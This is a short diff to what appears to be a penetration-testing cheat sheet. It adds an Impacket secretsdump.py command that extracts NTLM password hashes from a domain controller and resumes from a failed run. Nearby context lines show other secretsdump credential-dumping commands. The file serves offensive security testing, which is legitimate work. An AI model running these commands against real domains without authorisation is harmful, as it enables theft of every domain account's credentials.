@@ -39,6 +39,12 @@ secretsdump.py <domain>/<dc_bios_name>\$/@<dc_ip> -no-pass -just-dc-user "Admini
 secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<dc_ip>
 ```
 
+## secretsdump - remote extract (resume from fail)
+#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+```
+secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<dc_ip> -resumefile ./
+```
+
 ## secretsdump - remote extract + users infos
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
